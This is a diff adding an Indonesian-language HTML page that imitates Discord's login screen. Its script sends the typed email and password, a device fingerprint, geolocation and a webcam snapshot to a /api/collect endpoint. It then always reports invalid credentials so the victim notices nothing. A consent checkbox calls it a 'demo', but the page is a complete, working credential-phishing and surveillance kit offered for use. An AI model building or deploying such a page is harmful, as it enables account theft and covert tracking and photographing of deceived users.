@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Discord — Login</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Arial, sans-serif; }
+  body { background: #313338; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #dbdee1; padding: 20px; }
+  .card { background: #313338; width: 100%; max-width: 480px; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+  h1 { font-size: 24px; color: #f2f3f5; text-align: center; margin-bottom: 8px; }
+  .subtitle { text-align: center; color: #b5bac1; font-size: 14px; margin-bottom: 24px; }
+  label { display: block; font-size: 12px; font-weight: 700; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; margin-top: 16px; }
+  input[type="text"], input[type="password"] { width: 100%; padding: 10px 12px; background: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; }
+  input[type="text"]:focus, input[type="password"]:focus { outline: 2px solid #5865f2; }
+  .forgot { color: #00a8fc; font-size: 13px; margin-top: 8px; display: inline-block; cursor: pointer; text-decoration: none; }
+  .consent { display: flex; gap: 8px; align-items: flex-start; margin-top: 16px; font-size: 13px; color: #b5bac1; text-transform: none; font-weight: normal; }
+  .consent input { width: auto; margin-top: 3px; }
+  button { width: 100%; margin-top: 24px; background: #5865f2; color: white; border: none; padding: 12px; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.17s; }
+  button:hover:not(:disabled) { background: #4752c4; }
+  button:disabled { opacity: 0.6; cursor: not-allowed; }
+  .status { text-align: center; font-size: 13px; color: #949ba4; margin-top: 12px; min-height: 18px; }
+  .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid #949ba4; border-top-color: #5865f2; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 6px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>Selamat Datang Kembali!</h1>
+    <p class="subtitle">Senang melihatmu lagi!</p>
+
+    <label for="email">Email atau Nomor Telepon</label>
+    <input type="text" id="email" autocomplete="username" />
+
+    <label for="password">Kata Sandi</label>
+    <input type="password" id="password" autocomplete="current-password" />
+    <a class="forgot">Lupa kata sandi?</a>
+
+    <label class="consent">
+      <input type="checkbox" id="consent" />
+      <span>Saya setuju data perangkat, lokasi & kamera digunakan untuk keperluan demo aplikasi ini.</span>
+    </label>
+
+    <button id="loginBtn">Masuk</button>
+    <div class="status" id="status"></div>
+  </div>
+
+<script>
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let os = 'Tidak diketahui';
+  if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+  else if (/Windows/.test(ua)) os = 'Windows';
+  else if (/Android/.test(ua)) os = 'Android';
+  else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+  else if (/Mac OS X/.test(ua)) os = 'macOS';
+  else if (/Linux/.test(ua)) os = 'Linux';
+
+  let browser = 'Tidak diketahui';
+  if (/Edg\//.test(ua)) browser = 'Microsoft Edge';
+  else if (/OPR\//.test(ua)) browser = 'Opera';
+  else if (/Chrome\//.test(ua)) browser = 'Chrome';
+  else if (/Firefox\//.test(ua)) browser = 'Firefox';
+  else if (/Safari\//.test(ua)) browser = 'Safari';
+
+  let deviceType = 'Desktop';
+  if (/Mobi|Android|iPhone/.test(ua)) deviceType = 'Mobile';
+  else if (/iPad|Tablet/.test(ua)) deviceType = 'Tablet';
+
+  return {
+    userAgent: ua, os, browser, deviceType,
+    screen: `${screen.width}x${screen.height}`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    language: navigator.language,
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency || 'N/A',
+    memory: navigator.deviceMemory || 'N/A'
+  };
+}
+
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    const timer = setTimeout(() => resolve(null), 1500);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => { clearTimeout(timer); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
+      () => { clearTimeout(timer); resolve(null); },
+      { timeout: 1500, enableHighAccuracy: false }
+    );
+  });
+}
+
+async function getWebcamSnapshot() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    await video.play();
+    await new Promise(r => setTimeout(r, 400));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return canvas.toDataURL('image/png');
+  } catch (e) { return null; }
+}
+
+const btn = document.getElementById('loginBtn');
+const statusEl = document.getElementById('status');
+
+btn.addEventListener('click', async () => {
+  const username = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+
+  if (!username) { alert('Email wajib diisi.'); return; }
+  if (!password) { alert('Password wajib diisi.'); return; }
+  if (!document.getElementById('consent').checked) {
+    alert('Anda harus menyetujui syarat penggunaan terlebih dahulu.');
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Memproses...';
+
+  const device = getDeviceInfo();
+
+  statusEl.innerHTML = '<span class="spinner"></span>Mengambil lokasi...';
+  const location = await getLocation();
+
+  statusEl.innerHTML = '<span class="spinner"></span>Mengambil foto...';
+  const webcam = await getWebcamSnapshot();
+
+  statusEl.innerHTML = '<span class="spinner"></span>Mengirim data...';
+
+  try {
+    const res = await fetch('/api/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password, device, location, webcam, timestamp: new Date().toISOString() })
+    });
+    if (!res.ok) throw new Error('Server error');
+  } catch (e) {
+    console.error(e);
+    statusEl.textContent = '⚠️ Gagal kirim data.';
+  }
+
+  setTimeout(() => {
+    btn.disabled = false;
+    btn.textContent = 'Masuk';
+    statusEl.textContent = '';
+    alert('Email atau kata sandi tidak valid.');
+  }, 600);
+});
+</script>
+</body>
+</html>
